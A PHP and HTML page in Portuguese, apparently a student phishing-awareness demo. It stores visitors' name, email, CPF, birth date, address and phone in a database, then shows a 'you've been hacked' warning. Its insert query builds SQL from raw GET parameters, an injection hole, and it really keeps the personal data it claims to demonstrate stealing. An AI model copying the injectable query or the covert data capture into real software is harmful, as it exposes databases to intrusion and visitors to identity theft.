<?php
$nome1 = $_GET ["nome1"];
$nome2 = $_GET ["nome2"];
$nome3 = $_GET ["nome3"];
$nome4 = $_GET ["nome4"];
$nome5 = $_GET ["nome5"];
$nome6 = $_GET ["nome6"];
$nome7 = $_GET ["nome7"];

require "conexao.php";

$sql = "insert into info (nome,email,cpf,data,cep,telefone,bairro) values ('$nome1' , '$nome2' , '$nome3' , '$nome4' , '$nome5' , '$nome6' , '$nome7')";
$executar = mysqli_query($conexao,$sql);



?>


<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ALERTA DE SEGURANÇA</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background-color: #000;
            color: #ff0000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            overflow-x: hidden;
            position: relative;
        }
        
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><text x="10" y="50" font-family="monospace" font-size="10" fill="red">HACKEADO</text></svg>');
            opacity: 0.05;
            pointer-events: none;
            z-index: -1;
        }
        
        .container {
            max-width: 800px;
            text-align: center;
        }
        
        .alert-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 1.5s infinite;
        }
        
        .alert-title {
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 20px;
            text-transform: uppercase;
            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
            animation: glitch 3s infinite;
        }
        
        .alert-message {
            font-size: 24px;
            margin-bottom: 30px;
            line-height: 1.4;
            text-align: left;
        }
        
        .data-box {
            background-color: rgba(255, 0, 0, 0.1);
            border: 2px solid #ff0000;
            border-radius: 5px;
            padding: 20px;
            margin-bottom: 30px;
            width: 100%;
            text-align: left;
        }
        
        .data-heading {
            font-size: 20px;
            margin-bottom: 15px;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 10px;
        }
        
        .data-item {
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
        }
        
        .counter {
            font-size: 28px;
            margin: 30px 0;
            color: #fff;
            text-shadow: 0 0 8px #ff0000;
        }
        
        .blinking {
            animation: blink 1s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
        
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert-icon">⚠️</div>
        <h1 class="alert-title">Você foi hackeado!</h1>
        
        <div class="alert-message">
            <p class="blinking">ALERTA CRÍTICO DE SEGURANÇA</p>
            <p>Acabamos de capturar <strong>todos os seus dados pessoais</strong> através do formulário que você preencheu.</p>
            <p>Suas informações agora estão sendo enviadas para nossos servidores e serão utilizadas para diversos fins.</p>
        </div>
        
        <div class="data-box">
            <h2 class="data-heading">Dados capturados:</h2>
            <div class="data-item">
                <span>Nome completo</span>
                <span>[EXTRAÍDO]</span>
            </div>
            <div class="data-item">
                <span>CPF</span>
                <span>[EXTRAÍDO]</span>
            </div>
            <div class="data-item">
                <span>Data de nascimento</span>
                <span>[EXTRAÍDO]</span>
            </div>
            <div class="data-item">
                <span>Endereço completo</span>
                <span>[EXTRAÍDO]</span>
            </div>
            <div class="data-item">
                <span>Celular</span>
                <span>[EXTRAÍDO]</span>
            </div>
            <div class="data-item">
                <span>E-mail</span>
                <span>[EXTRAÍDO]</span>
            </div>
        </div>
        
        <div class="counter" id="counter">
            Transferindo dados: <span class="transfer-percent">0%</span>
        </div>
        
        <div class="alert-message">
            <p>Lembre-se: <strong>nunca compartilhe seus dados pessoais em sites suspeitos</strong>.</p>
            <p>Esta é uma demonstração de como golpistas podem criar páginas aparentemente legítimas para roubar suas informações.</p>
            <p class="blinking">FIQUE ALERTA. PROTEJA SEUS DADOS.</p>
        </div>
    </div>
    
    <script>
        // Simulação de transferência de dados
        let percent = 0;
        const transferPercent = document.querySelector('.transfer-percent');
        
        const interval = setInterval(() => {
            percent += Math.floor(Math.random() * 5) + 1;
            if (percent >= 100) {
                percent = 100;
                clearInterval(interval);
                transferPercent.textContent = "100% - COMPLETO";
            } else {
                transferPercent.textContent = percent + "%";
            }
        }, 150);
    </script>
    
    <footer>
        <p>Desenvolvido por Diego, Lucas e Marcílio e Alexandre</p>
    </footer>
</body>
</html>


